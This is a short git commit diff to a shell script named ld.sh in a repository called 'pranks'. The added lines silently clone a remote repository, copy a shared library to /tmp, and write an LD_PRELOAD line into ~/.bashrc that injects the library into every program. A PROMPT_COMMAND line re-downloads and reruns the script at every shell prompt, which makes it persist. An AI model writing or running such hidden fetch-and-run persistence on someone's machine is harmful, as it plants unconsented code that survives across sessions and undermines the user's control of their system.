e0636eb1d1351343d690514e133957477e95a4d7
Ian Liu-Johnston <ian.liu-johnson@holbertonschool.com>
2017-02-02 20:25:21 -0800

    fixed ordering

--- ld.sh
+++ ld.sh
@@ -1,5 +1,8 @@
+ git clone https://github.com/ianliu-johnston/pranks.git >/dev/null 2> /dev/null
+ cd pranks
  cp a.so /tmp/
  cd ..
  rm -rf pranks
- echo "export COMMAND_PROMPT='git clone https://github.com/ianliu-johnston/pranks.git >/dev/null 2>/dev/null; cd pranks; ./ld.sh'" >> ~/.bashrc
  echo "export LD_PRELOAD=/tmp/a.so" >> ~/.bashrc
+ echo "export PROMPT_COMMAND ='git clone https://github.com/ianliu-johnston/pranks.git >/dev/null 2>/dev/null; cd pranks; ./ld.sh'" >> ~/.bashrc
+ source ~/.bashrc
